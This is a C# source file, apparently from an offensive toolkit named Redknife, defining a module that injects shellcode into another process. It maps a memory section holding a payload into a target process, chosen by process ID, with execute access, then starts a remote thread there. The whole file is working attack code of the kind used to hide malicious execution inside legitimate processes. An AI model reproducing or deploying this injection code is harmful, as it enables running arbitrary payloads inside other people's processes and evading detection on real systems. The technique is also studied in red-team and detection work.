using System;
using System.Runtime.InteropServices;
using Redknife.APIs;

namespace Redknife.Modules
{
    public class NtProcessInjection : BaseProcessAwareModule
    {

        private static uint EXECUTE_READ_WRITE = 0x040;

        private static uint SEC_COMMIT = 0x08000000;
        private static uint SECTION_MAP_WRITE = 0x0002;
        private static uint SECTION_MAP_READ = 0x0004;
        private static uint SECTION_MAP_EXECUTE = 0x0008;
        private static uint SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;

        public override void Run()
        {
            // Allocate memory for the shellcode
            IntPtr SectionHandle = IntPtr.Zero; // the section handle we're going to get as the result of a successful NtCreateSection call.
            long buf_size = this.Payload.Length;
            UInt32 createSectionStatus = NtDLL.NtCreateSection(ref SectionHandle, SECTION_ALL_ACCESS, IntPtr.Zero, ref buf_size, EXECUTE_READ_WRITE, SEC_COMMIT, IntPtr.Zero);

            // NtCreateSection returns STATUS_SUCCESS when the operation is successful. STATUS_SUCCESS equals to 0
            if (createSectionStatus != 0 || SectionHandle == IntPtr.Zero)
            {
                throw new Exception("An error occured while creating the section. (NtCreateSection)");
            }
            LogUtil.Info("The section has been created successfully.", 1);
            LogUtil.Info("ptr_section_handle: 0x{0}", 1, String.Format("{0:X}", (SectionHandle).ToInt64()));

            // NtMapViewOfSection - This function maps the a view of a section into the Virtual Address Space (VAS) of a process
            long LocalSectionOffset = 0;
            IntPtr ptrLocalSectionAddr = IntPtr.Zero;
            UInt32 localMapViewStatus = NtDLL.NtMapViewOfSection(SectionHandle, Kernel32.GetCurrentProcess(), ref ptrLocalSectionAddr, IntPtr.Zero, IntPtr.Zero, ref LocalSectionOffset, ref buf_size, 0x2, 0, 0x04);
            if (localMapViewStatus != 0 || ptrLocalSectionAddr == IntPtr.Zero)
            {
                throw new Exception("An error occured while mapping the view within the local section. (NtMapViewOfSection");
            }
            LogUtil.Info("The local section view's been mapped successfully with PAGE_READWRITE access.", 1);
            LogUtil.Info("ptr_local_section_addr: 0x{0}", 1, String.Format("{0:X}", (ptrLocalSectionAddr).ToInt64()));

            // Copy the shellcode into the mapped section.
            Marshal.Copy(this.Payload, 0, ptrLocalSectionAddr, this.Payload.Length);

            // Map a view of the section in the virtual address space of the targeted process.
            IntPtr hProcess = Kernel32.OpenProcess(0x001F0FFF, false, (int)this.Args.PID);
            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            UInt32 remote_map_view_status = NtDLL.NtMapViewOfSection(SectionHandle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref LocalSectionOffset, ref buf_size, 0x2, 0, 0x20);
            if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
            {
                throw new Exception("An error occured while mapping the view within the remote section. (NtMapViewOfSection)");
            }
            LogUtil.Info("The remote section view's been mapped successfully with PAGE_EXECUTE_READ access.", 1);
            LogUtil.Info("ptr_remote_section_addr: 0x{0}", 1, String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));

            // Unmap the view of the section from the current process & close the handle.
            NtDLL.NtUnmapViewOfSection(Kernel32.GetCurrentProcess(), ptrLocalSectionAddr);
            NtDLL.NtClose(SectionHandle);

            // Create the thread
            Kernel32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

    }
}
